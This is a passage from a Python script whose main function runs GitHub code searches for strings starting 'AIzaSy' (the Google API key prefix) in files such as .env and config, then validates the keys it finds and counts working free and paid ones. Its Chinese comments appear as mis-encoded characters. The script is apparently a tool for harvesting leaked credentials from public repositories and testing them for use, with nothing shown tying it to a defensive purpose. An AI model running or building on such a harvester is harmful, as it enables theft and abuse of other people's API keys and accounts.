        if hasattr(self.validator, 'validate_batch_async'):
            return await self.validator.validate_batch_async(keys)
        else:
            # å¦åˆ™åœ¨çº¿ç¨‹æ± ä¸­è¿è¡ŒåŒæ­¥éªŒè¯
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(
                self._executor,
                self.validator.validate_batch,
                keys
            )


async def main():
    """ä¸»å‡½æ•°ç¤ºä¾‹"""
    # åˆå§‹åŒ–åè°ƒå™¨
    orchestrator = OrchestratorV2()
    
    # æµ‹è¯•æŸ¥è¯¢
    queries = [
        "AIzaSy in:file",
        "AIzaSy in:file filename:.env",
        "AIzaSy in:file filename:config"
    ]
    
    # è¿è¡Œ
    stats = await orchestrator.run(queries, max_loops=1)
    
    # æ˜¾ç¤ºç»“æœ
    print(f"\nâœ… Run completed: {stats.run_id}")
    print(f"   Valid keys found: {stats.by_status[KeyStatus.VALID_FREE] + stats.by_status[KeyStatus.VALID_PAID]}")


if __name__ == "__main__":
    import asyncio
    
    # è®¾ç½®æ—¥å¿—
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s | %(levelname)s | %(name)s | %(message)s'
    )
    
    # è¿è¡Œ
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Program interrupted")